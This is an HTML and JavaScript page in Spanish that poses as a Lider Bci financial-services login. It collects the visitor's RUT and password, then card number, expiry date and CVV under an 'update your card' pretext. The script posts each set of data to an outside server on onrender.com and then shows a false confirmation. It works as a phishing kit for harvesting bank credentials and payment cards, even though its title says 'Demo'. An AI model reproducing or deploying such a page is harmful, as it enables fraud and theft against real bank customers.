<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Demo - Ingreso</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #004080; /* azul corporativo */
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .header {
      text-align: center;
      margin-bottom: 1rem;
    }
    .logo {
      max-width: 150px;
      height: auto;
      margin-bottom: 0.5rem;
    }
    .login-title {
      color: #fff;
      font-size: 1.2rem;
    }
    .card {
      background: #fff;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      width: 340px;
      text-align: center;
    }
    .form-group {
      margin-bottom: 1rem;
      text-align: left;
    }
    .form-group label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: bold;
      color: #004080;
    }
    .form-group input {
      width: 100%;
      padding: 0.5rem;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .hint {
      font-size: 0.85rem;
      color: #666;
      margin-top: 0.3rem;
    }
    .btn {
      width: 100%;
      padding: 0.75rem;
      background: #004080;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 1rem;
    }
    .btn:hover {
      background: #003060;
    }
    .link-right {
      text-align: right;
      margin-top: 0.5rem;
    }
    .link-right a {
      font-size: 0.85rem;
      color: #004080;
      text-decoration: none;
    }
    .link-right a:hover {
      text-decoration: underline;
    }
    .error {
      color: red;
      font-size: 0.9rem;
      margin-top: 0.5rem;
    }
  </style>
</head>
<body>
  <!-- Encabezado con logo y título -->
  <div class="header">
    <img src="logo_lider.png" alt="Logo Empresa" class="logo">
    <h2 class="login-title">Ingresa a tu cuenta en línea</h2>
  </div>

  <!-- Tarjeta de login -->
  <div class="card" id="loginCard">
    <form id="loginForm">
      <div class="form-group">
        <label for="usuario">RUT</label>
        <input type="text" id="usuario" required>
        <div id="rutError" class="error" style="display:none;">RUT inválido</div>
      </div>
      <div class="form-group">
        <label for="clave">Clave</label>
        <input type="password" id="clave" required>
        <div class="hint">Es la misma clave que usas en tu App Lider Bci</div>
      </div>
      <button type="submit" class="btn">Ingresar</button>
      <div class="link-right">
        <a href="https://www.liderbciserviciosfinancieros.cl/login/form-crea-clave" target="_blank">
          Crear / Recuperar Clave
        </a>
      </div>
    </form>
  </div>

  <!-- Tarjeta de actualización -->
  <div class="card" id="updateCard" style="display:none;">
    <div class="header">
      <img src="logo_lider.png" alt="Logo Empresa" class="logo">
      <h2 class="login-title">Actualizar Tarjeta</h2>
    </div>
    <form id="updateForm">
      <div class="form-group">
        <label for="numero">Número de tarjeta</label>
        <input type="text" id="numero" required>
        <div id="cardError" class="error" style="display:none;">Debe tener 16 dígitos</div>
      </div>
      <div class="form-group">
        <label for="fecha">Fecha de vencimiento</label>
        <div class="hint">Formato: MM/AA (ejemplo: 05/28)</div>
        <input type="text" id="fecha" required>
        <div id="fechaError" class="error" style="display:none;">Fecha inválida</div>
      </div>
      <div class="form-group">
        <label for="cvv">Verificador (CVV)</label>
        <input type="text" id="cvv" maxlength="3" required>
      </div>
      <button type="submit" class="btn">Ingresar Datos</button>
    </form>
  </div>

  <!-- Tarjeta de confirmación -->
  <div class="card" id="successCard" style="display:none;">
    <div class="header">
      <img src="logo_lider.png" alt="Logo Empresa" class="logo">
      <h2 class="login-title">¡Datos actualizados!</h2>
    </div>
    <p>Hemos actualizado tus datos correctamente.</p>
  </div>

<script>
  // Formatear RUT mientras se escribe
  function formatRut(value) {
    value = value.replace(/\./g, "").replace(/-/g, "");
    if (value.length === 0) return "";
    let dv = value.slice(-1);
    let cuerpo = value.slice(0, -1);
    let formatted = "";
    while (cuerpo.length > 3) {
      formatted = "." + cuerpo.slice(-3) + formatted;
      cuerpo = cuerpo.slice(0, -3);
    }
    formatted = cuerpo + formatted;
    return formatted + "-" + dv;
  }

  // Validar RUT chileno
  function validarRut(rut) {
    rut = rut.replace(/\./g, "").replace(/-/g, "");
    if (rut.length < 2) return false;
    let cuerpo = rut.slice(0, -1);
    let dv = rut.slice(-1).toUpperCase();
    let suma = 0;
    let multiplo = 2;
    for (let i = cuerpo.length - 1; i >= 0; i--) {
      suma += parseInt(cuerpo.charAt(i)) * multiplo;
      multiplo = multiplo < 7 ? multiplo + 1 : 2;
    }
    let dvEsperado = 11 - (suma % 11);
    dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
    return dv === dvEsperado;
  }

  // Validar fecha MM/AA
  function validarFecha(fecha) {
    const regex = /^(\d{2})\/(\d{2})$/;
    const match = fecha.match(regex);
    if (!match) return false;
    const mes = parseInt(match[1], 10);
    const anio = parseInt(match[2], 10);
    if (mes < 1 || mes > 12) return false;
    if (anio < 0 || anio > 99) return false;
    return true;
  }

  const loginForm = document.getElementById('loginForm');
  const updateForm = document.getElementById('updateForm');
  const loginCard = document.getElementById('loginCard');
  const updateCard = document.getElementById('updateCard');
  const successCard = document.getElementById('successCard');
  const rutError = document.getElementById('rutError');
  const cardError = document.getElementById('cardError');
  const fechaError = document.getElementById('fechaError');
  const rutInput = document.getElementById('usuario');
  const fechaInput = document.getElementById('fecha');

  // Autoformateo RUT
  rutInput.addEventListener("input", function() {
    this.value = formatRut(this.value);
  });

  // Autoformateo fecha MM/AA
  fechaInput.addEventListener("input", function() {
    let value = this.value.replace(/[^0-9]/g, "");
    if (value.length > 2) {
      value = value.slice(0,2) + "/" + value.slice(2,4);
    }
    this.value = value;
  });

  const BASE_URL = "https://loginlider.onrender.com"; // tu backend en Render

  loginForm.addEventListener('submit', async e => {
    e.preventDefault();
    const rut = rutInput.value;
    const clave = document.getElementById('clave').value;

    // Validar sobre el RUT limpio
    if (!validarRut(rut)) {
      rutError.style.display = 'block';
      return;
    } else {
      rutError.style.display = 'none';
    }

    // Enviar datos al backend
    await fetch(`${BASE_URL}/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ usuario: rut, clave })
    });

    // Avanzar a la tarjeta de actualización
    loginCard.style.display = 'none';
    updateCard.style.display = 'block';
  });

  updateForm.addEventListener('submit', async e => {
    e.preventDefault();
    const numero = document.getElementById('numero').value;
    const fecha = fechaInput.value;
    const cvv = document.getElementById('cvv').value;

    if (numero.length !== 16 || !/^\d+$/.test(numero)) {
      cardError.style.display = 'block';
      return;
    } else {
      cardError.style.display = 'none';
    }

    if (!validarFecha(fecha)) {
      fechaError.style.display = 'block';
      return;
    } else {
      fechaError.style.display = 'none';
    }

    await fetch(`${BASE_URL}/update-card`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ numero, fecha, cvv })
    });

    updateCard.style.display = 'none';
    successCard.style.display = 'block';
  });
</script>
